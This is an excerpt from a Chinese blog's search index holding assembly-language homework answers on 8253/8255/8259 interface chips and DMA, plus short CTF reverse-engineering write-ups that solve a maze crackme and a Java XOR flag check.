title="1.简述接口的概念和功能"></a>1.简述接口的概念和功能</h3><p>接口就是连接与外设之间的部件，它完成与外设之间的信息传送。还包括辅助工作的外围电路。</p><p>接口的功能<br>1.执行命令的功能;<br>2.返回外设状态的功能;<br>3.数据缓冲功能;<br>4.信号转换功能;<br>5.设备选择功能;<br>6.数据宽度与数据格式转换功能</p><h3 id="2-简述独立编址或统一编址的接口的区别和各自的优缺点。"><a href="#2-简述独立编址或统一编址的接口的区别和各自的优缺点。" class="headerlink" title="2.简述独立编址或统一编址的接口的区别和各自的优缺点。"></a>2.简述独立编址或统一编址的接口的区别和各自的优缺点。</h3><p>1.独立编址(专用的I/O端口编址)——存储器和I/O端口在两个独立的地址空间中<br>(1)优点：I/O端口的地址码较短，译码电路简单，存储器同I/O端口的操作指令不同，程序比较清晰；存储器和I/O端口的控制结构相互独立，可以分别设计<br>(2)缺点：需要有专用的I/O指令，程序设计的灵活性较差</p><p>2.统一编址(存储器映像编址)——存储器和I/O端口共用统一的地址空间，当一个地址空间分配给I/O端口以后，存储器就不能再占有这一部分的地址空间<br>(1)优点：不需要专用的I/O指令，任何对存储器数据进行操作的指令都可用于I/O端口的数据操作，程序设计比较灵活；由于I/O端口的地址空间是内存空间的一部分，这样，I/O端口的地址空间可大可小，从而使外设的数量几乎不受限制<br>(2)缺点：I/O端口占用了内存空间的一部分，影响了系统的内存容量；访问I/O端口也要同访问内存一样，由于内存地址较长，导致执行时间增加</p><h2 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h2><h3 id="3-若8253芯片的接口地址为0D0D0H-0D0D3H，时钟信号为2MHz。现利用计数器0、1、2分别产生周期为，10us的对称方波及每1ms和1s产生一个负脉冲，试画出其与系统的电路连接图，并编写包括初始化在内的程序。"><a href="#3-若8253芯片的接口地址为0D0D0H-0D0D3H，时钟信号为2MHz。现利用计数器0、1、2分别产生周期为，10us的对称方波及每1ms和1s产生一个负脉冲，试画出其与系统的电路连接图，并编写包括初始化在内的程序。" class="headerlink" title="3.若8253芯片的接口地址为0D0D0H~0D0D3H，时钟信号为2MHz。现利用计数器0、1、2分别产生周期为，10us的对称方波及每1ms和1s产生一个负脉冲，试画出其与系统的电路连接图，并编写包括初始化在内的程序。"></a>3.若8253芯片的接口地址为0D0D0H~0D0D3H，时钟信号为2MHz。现利用计数器0、1、2分别产生周期为，10us的对称方波及每1ms和1s产生一个负脉冲，试画出其与系统的电路连接图，并编写包括初始化在内的程序。</h3><p>解:根据题目要求可知，计数器0 (CNTO)工作于方式3，计数器1 (CNT1) 和计数器2 (CNT2)工作于方式2。时钟频率2MHz,即周期为0.5us,从而得出各计数器的计数初值分别为:<br>CNTO:<br>    10us/0.5us= 20<br>CNT1:<br>    1 ms/0.5us = 2000<br>CNT2:<br>    1s/0.5us= 2 X 1000000<br>显然，计数器2的计数初值已超出了16位数的表达范围，需经过一次中间 分频，可将OUT1端的输出脉冲作为计数器2的时钟频率。这样，CNT2的计数初值就等于1s/1ms= 1000。线路连接如图所示。<br><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E4%B8%8E%E6%8E%A5%E5%8F%A3%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%9A%E4%BA%8C/1.png" alt></p><p><strong>8253的初始化程序如下:</strong><br><pre class="line-numbers language-assme" data-language="assme"><code class="language-assme">MOV DX, 0D0D3HMOV AL, 16H             ;计数器0，低8位计数，方式3OUT DX, ALMOV AL, 74H             ;计数器1，双字节计数，方式2OUT DX, ALMOV AL, 0B4H            ;计数器2，双字节计数，方式2OUT DX, ALMOV DX, 0D0D0HMOV AL, 20              ;送计数器0的计数初值OUT DX, ALMOV DX, 0D0D1HMOV AX, 2000            ;送计数器1的计数初值OUT DX, ALMOV AL, AHOUT DX, ALMOV DX，0D0D2HMOV AX, 1000            ;送计数器2的计数初值OUT DX, ALMOV AL, AHOUT DX, AL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="6-某系统使用8254的通道0作为计数器，计满1000时，向CPU发送中断请求，试编写初始化程序-端口地址自设-。"><a href="#6-某系统使用8254的通道0作为计数器，计满1000时，向CPU发送中断请求，试编写初始化程序-端口地址自设-。" class="headerlink" title="6.某系统使用8254的通道0作为计数器，计满1000时，向CPU发送中断请求，试编写初始化程序(端口地址自设)。"></a>6.某系统使用8254的通道0作为计数器，计满1000时，向CPU发送中断请求，试编写初始化程序(端口地址自设)。</h3><p>解:<br>设端口地址为80H~83H<br><pre class="line-numbers language-none"><code class="language-none">MOV AL, 001 10000BOUT 83H, ALMOV AX, 1000OUT 80H, ALMOV AL, AHOUT 80H, AL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="9-什么是波特率-假设异步传输的一-帧信息由1位起始位、7位数据位、1位校验位和1位停止位构成，传送的波特率为9600bps，则每秒钟能传输的字符个数是多少"><a href="#9-什么是波特率-假设异步传输的一-帧信息由1位起始位、7位数据位、1位校验位和1位停止位构成，传送的波特率为9600bps，则每秒钟能传输的字符个数是多少" class="headerlink" title="9.什么是波特率?假设异步传输的一-帧信息由1位起始位、7位数据位、1位校验位和1位停止位构成，传送的波特率为9600bps，则每秒钟能传输的字符个数是多少?"></a>9.什么是波特率?假设异步传输的一-帧信息由1位起始位、7位数据位、1位校验位和1位停止位构成，传送的波特率为9600bps，则每秒钟能传输的字符个数是多少?</h3><p>解:波特率表示每秒钟传送二进制的位数。每秒钟能传输的字符个数为9600/10=960</p><h3 id="16-假设8255A的端口地址为00C0H-00C6H，按下面要求编写初始化程序。"><a href="#16-假设8255A的端口地址为00C0H-00C6H，按下面要求编写初始化程序。" class="headerlink" title="16.假设8255A的端口地址为00C0H~00C6H，按下面要求编写初始化程序。"></a>16.假设8255A的端口地址为00C0H~00C6H，按下面要求编写初始化程序。</h3><p>(1)对8255A设置工作方式，A端口工作在方式1，输入; B端口工作在方式0,输出;C端口的高4位配合A端口工作，C端口的低4位为方式0，输入。<br>(2)用置0/置1方式直接对PC6置1,对PC4置0</p><pre class="line-numbers language-none"><code class="language-none">答:端口地址0000 0000 1100 0000 ~0000 0000 1100 0110。说明A口地址为00C0H, B口地址为00C2H，C口地址为00C4H,控制字地址为00C6H。(1)控制字为: 1011X001B， 即0B1H(X取0)MOV AL, 0B1HMOV DX, 00C6HOUT DX, AL(2)&lt;1&gt;直接对PC6置1时的控制字为: 0XXX1101B，即0DHMOV AL, 0DHMOV DX, 00C6HOUT DX, AL&lt;2&gt;直接对PC4置0时的控制字为: 0XXX1000B，即08HMOV AL, 08HMOV DX, 00C6HOUT DX, AL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><h3 id="7-假设8259A的端口地址为92H、93H，如何用它的命令字来禁止IR3和IR5引脚上的请求，又如何撤销这一禁止命令"><a href="#7-假设8259A的端口地址为92H、93H，如何用它的命令字来禁止IR3和IR5引脚上的请求，又如何撤销这一禁止命令" class="headerlink" title="7.假设8259A的端口地址为92H、93H，如何用它的命令字来禁止IR3和IR5引脚上的请求，又如何撤销这一禁止命令?"></a>7.假设8259A的端口地址为92H、93H，如何用它的命令字来禁止IR3和IR5引脚上的请求，又如何撤销这一禁止命令?</h3><pre class="line-numbers language-none"><code class="language-none">解:运用操作命令字0CW1来完成，该操作命令字是奇地址93HIN AL 93HOR AL,00101000OUT 93H,AL撤销:IN AL 93HAND AL,11010111OUT 93H,AL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="12-DMA方式的特点是什么？DMA控制器在系统中起什么作用？"><a href="#12-DMA方式的特点是什么？DMA控制器在系统中起什么作用？" class="headerlink" title="12.DMA方式的特点是什么？DMA控制器在系统中起什么作用？"></a>12.DMA方式的特点是什么？DMA控制器在系统中起什么作用？</h3><p>利用它进行数据传送时不需要CPU的参与。每台电脑主机板上都有DMA控制器，通常计算机对其编程，并用一个适配器上的ROM(如软盘驱动控制器上的ROM)来储存程序，这些程序控制DMA传送数据。一旦控制器初始化完成，数据开始传送，DMA就可以脱离CPU，独立完成数据传送。 </p><p>DMA是直接存取方式。是在存储器与输入输出设备间直接传送数据，提高传输效率，是一种完全由硬件完成输入输出操作的方式。 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 新手 </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python写入二进制文件</title>
      <link href="2020/12/26/python%E5%86%99%E5%85%A5%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
      <url>2020/12/26/python%E5%86%99%E5%85%A5%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>很好奇怎么使用python写入二进制文件以十六进制，就学习了一下，需要用到python的struct包，这里以一道ctf的misc题目为例子，首先题目给出的是base64的代码，我要做的就是将其转为十六进制并将其十六进制的内容写入文件，代码如下:<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU不一样的flag</title>
      <link href="2020/12/22/BUU%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/"/>
      <url>2020/12/22/BUU%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-首先是32位的ida打开"><a href="#1-首先是32位的ida打开" class="headerlink" title="1.首先是32位的ida打开"></a>1.首先是32位的ida打开</h2><p>打开之后看main函数的c代码，伪代码如下：<br><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+17h] [ebp-35h] BYREF</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+34h] [ebp-18h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+38h] [ebp-14h] BYREF</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-10h]</span>  _BYTE v7<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+40h] [ebp-Ch] BYREF</span>  <span class="token function">__main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token string">"*11110100001010000101111#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>                                             <span class="token comment">// //下面这些是打印到屏幕上的内容</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you can choose one action to execute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1 up"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2 down"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3 left"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"4 right\n:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 接受一个v5变量</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token operator">--</span>v4<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>LABEL_13<span class="token operator">:</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>v4<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>      <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">41</span> <span class="token operator">+</span> v4<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">41</span> <span class="token operator">+</span> v4<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'#'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nok, the order you enter is the flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>从上面看起来反汇编得一团糟的代码里面依稀可以看出他的目的似乎是这样的一个迷宫<br><pre class="line-numbers language-none"><code class="language-none">*11110100001010000101111#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>限制条件为，碰到1则exit出去，从*开始，到#结束，中间必须得沿着0走，所以flag为最终走的方向所代表的数字:<br><code>flag&#123;222441144222&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java逆向解密</title>
      <link href="2020/12/21/Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/"/>
      <url>2020/12/21/Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>肚子疼，做个java逆向玩玩就不疼了</strong></p><h3 id="1-class文件逆向"><a href="#1-class文件逆向" class="headerlink" title="1.class文件逆向"></a>1.class文件逆向</h3><p>直接用JD打开之后获得源码为以下:<br><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Reverse</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Scanner</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>"<span class="token class-name">Please</span> input the flag <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> str <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>"<span class="token class-name">Your</span> input is <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> stringArr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Encrypt</span><span class="token punctuation">(</span>stringArr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Encrypt</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//密钥验证之res</span>    <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token class-name">Resultlist</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> result <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">^</span> <span class="token number">0x20</span><span class="token punctuation">;</span>      <span class="token class-name">Resultlist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">//密钥验证之key</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> KEY <span class="token operator">=</span> <span class="token punctuation">&#123;</span>         <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span>         <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">65</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token class-name">KEYList</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> KEY<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token class-name">KEYList</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>KEY<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Result:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Resultlist</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">KEYList</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>"<span class="token class-name">Congratulations</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>"<span class="token class-name">Error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>很简单的逻辑，先将我们输入的内容进行简单的加密之后<code>int result = arr[i] + 64 ^ 0x20;</code>转为char与key转为char相比较，若是比较相同则true否则false。</p><p>那反过来要找输入就要进行<code>(char)(key - 64 ^ 0x20);</code>的操作了，用python解决<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#-----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io or http://a16ne.cn </span><span class="token comment">#-----------------------------------------------------</span>flag <span class="token operator">=</span> <span class="token string">""</span>key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span> <span class="token operator">^</span> <span class="token number">0x20</span><span class="token punctuation">)</span>    flag <span class="token operator">+=</span> res<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>输出:<code>This_is_the_flag_!</code></p><p>所以flag为:<code>flag&#123;This_is_the_flag_!&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
        </tags>
